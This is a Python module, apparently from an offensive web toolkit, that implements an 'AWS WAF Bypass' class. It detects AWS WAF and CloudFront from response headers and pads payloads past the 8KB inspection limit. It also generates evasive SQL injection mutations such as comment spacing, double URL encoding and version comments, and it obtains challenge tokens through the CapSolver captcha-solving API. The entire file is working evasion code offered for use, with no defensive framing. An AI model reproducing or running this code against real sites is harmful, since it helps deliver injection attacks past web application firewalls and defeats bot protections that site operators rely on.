"""
AWS WAF Bypass Module 2026
Comprehensive bypass for AWS WAF + CloudFront.
Techniques:
- curl_cffi TLS fingerprint impersonation
- Oversized Payloads (bypass 8KB rule limits)
- WAFFLED parsing discrepancies
- CapSolver API for challenge token
- Origin IP discovery (CloudFront -> direct S3/ALB)
"""
import logging, asyncio, re, json
from typing import Optional, Dict, List
from core.bypass.bypass_base import BaseBypass

logger = logging.getLogger(__name__)


class AWSWAFBypass(BaseBypass):
    def __init__(self, timeout: int = 15):
        super().__init__(timeout)
        self.aws_region = "us-east-1"

    @staticmethod
    def detect(headers: dict, body: str = "") -> bool:
        if not headers:
            return False
        x_amzn_trace = headers.get("x-amzn-trace-id", "")
        x_amz_request = headers.get("x-amz-request-id", "")
        x_amz_id = headers.get("x-amz-id-2", "")
        via = headers.get("via", "")
        server = headers.get("server", "")
        cookies = headers.get("set-cookie", "")
        waf_blocked = "403" in str(headers.get(":status", "")) and \
                      ("RequestBlocked" in body or "waf" in body.lower())
        return bool(x_amzn_trace) or bool(x_amz_request) or bool(x_amz_id) or \
               "cloudfront" in via or "cloudfront" in server or \
               "aws-waf-token" in cookies or waf_blocked

    async def find_origin(self, hostname: str, env: dict = None) -> Optional[str]:
        return await super().find_origin(hostname, env)

    @staticmethod
    def oversized_payload(payload: str, min_size: int = 8192) -> str:
        padding = "A" * max(0, min_size - len(payload))
        return payload + padding

    @staticmethod
    def mutate_sqli(payload: str) -> List[str]:
        mutations = [
            payload.replace(" ", "/**/"),
            payload.replace("=", " LIKE "),
            payload.replace("'", "%2527"),
            payload.replace("1", "0x1"),
            f"/*!{payload}*/",
            f"{payload}-- -",
            payload.replace("SELECT", "sElEcT"),
            payload.replace("OR", "||"),
        ]
        return mutations

    async def capsolver_bypass(self, url: str) -> Optional[Dict]:
        try:
            import requests as sync_req
            resp = sync_req.post(
                "https://api.capsolver.com/createTask",
                json={
                    "clientKey": "CAP-XXXX",
                    "task": {
                        "type": "AntiAwsWafTask",
                        "websiteURL": url,
                        "awsRegion": self.aws_region,
                    }
                },
                timeout=30
            )
            if resp.status_code == 200:
                solution = resp.json().get("solution", {})
                return {"cookie": solution.get("cookie", ""), "token": solution.get("token", "")}
        except:
            pass
        return None

    async def bypass(self, hostname: str, env: dict = None, proxy_url: Optional[str] = None) -> Dict:
        url = f"https://{hostname}/"
        result = await self.bypass_with_curl_cffi(url, proxy_url)
        if result.get("success"):
            return result
        oversized = await self.bypass_with_oversized_payload(url, 32768, proxy_url)
        if oversized.get("success"):
            return oversized
        capsolver = await self.capsolver_bypass(url)
        if capsolver:
            return {"success": True, "method": "capsolver", "cookie": capsolver.get("cookie", "")[:50]}
        return {"success": False, "method": "all_failed"}
